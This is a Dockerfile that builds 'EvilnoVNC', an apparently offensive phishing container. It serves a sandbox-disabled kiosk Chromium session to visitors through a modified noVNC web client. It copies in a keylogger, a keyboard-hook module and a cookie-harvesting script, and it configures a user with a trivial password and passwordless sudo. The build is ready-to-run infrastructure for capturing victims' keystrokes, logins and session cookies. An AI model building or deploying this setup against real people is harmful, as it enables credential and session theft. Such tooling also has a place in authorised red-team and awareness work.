FROM alpine

LABEL maintainer="JoelGMSec - https://darkbyte.net"

ENV DISPLAY :0

RUN apk add sudo bash xvfb xdpyinfo x11vnc chromium python3 py3-pip git openssl curl gcc libc-dev python3-dev php socat python3-tkinter py3-pycryptodome py3-xlib wqy-zenhei vulkan-tools jq vim && \
    rm -rf /usr/bin/python && ln -s /usr/bin/python3 /usr/bin/python && \
    echo 'CHROMIUM_FLAGS="--window-size=WIDTH,HEIGHT --window-position=0,0 --disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --kiosk --no-sandbox --password-store=basic --start-fullscreen --noerrdialogs --no-first-run"' >> /etc/chromium/chromium.conf 

COPY Files/server.sh /home/user/ 
COPY Files/kiosk.sh /home/user/ 
COPY Files/startVNC.sh /home/user/ 
RUN sudo chmod +x /home/user/startVNC.sh
RUN sudo chmod +x /home/user/server.sh
RUN sudo chmod +x /home/user/kiosk.sh

RUN adduser -h /home/user -s /bin/bash -S -D user && echo "user:false" | chpasswd && \
    echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

USER user
WORKDIR /home/user

RUN mkdir -p /home/user/.vnc && x11vnc -storepasswd false /home/user/.vnc/passwd && \
    git clone https://github.com/novnc/noVNC.git /home/user/noVNC && \
    git clone https://github.com/novnc/websockify /home/user/noVNC/utils/websockify && \
    rm -rf /home/user/noVNC/.git && \
    rm -rf /home/user/noVNC/utils/websockify/.git && \
    sudo apk del git

COPY Files/cookies.py /home/user/ 
COPY Files/pyxhook.py /home/user/
COPY Files/keylogger.py /home/user/
COPY Files/vnc_lite.html /home/user/noVNC/
COPY Files/cursor.js /home/user/noVNC/core/util/
RUN sed -i 's/rgb(40, 40, 40)/white/' /home/user/noVNC/core/rfb.js
RUN sed -i 's/qualityLevel = 6/qualityLevel = 9/' /home/user/noVNC/core/rfb.js
RUN sed -i 's/compressionLevel = 2/compressionLevel = 0/' /home/user/noVNC/core/rfb.js
COPY Files/ui.js /home/user/noVNC/app/
COPY Files/kiosk.zip /home/user/
COPY Files/index.php /home/user/

ENTRYPOINT ["/bin/bash","-c", "\
            EvilnoVNC () { \
                ./server.sh \"$@\"; \
            }; \"$@\"", "foo"]

EXPOSE 80
EXPOSE 81
CMD ["EvilnoVNC"]